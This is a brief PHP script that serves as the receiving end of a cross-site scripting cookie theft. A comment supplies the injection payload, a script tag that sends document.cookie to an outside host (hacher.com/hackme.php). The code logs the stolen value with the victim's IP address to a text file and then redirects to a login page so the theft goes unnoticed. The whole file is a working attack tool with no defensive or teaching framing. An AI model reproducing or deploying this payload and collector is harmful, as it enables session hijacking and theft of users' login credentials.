<?php

// Use <script>location.href="http://hacher.com/hackme.php?data="+document.cookie</script>

$data = $_GET['data'] . " | {$_SERVER['REMOTE_ADDR']}";

File_put_contents('userdata.txt', $data. PHP_EOL , FILE_APPEND | LOCK_EX);

header("location: login.php");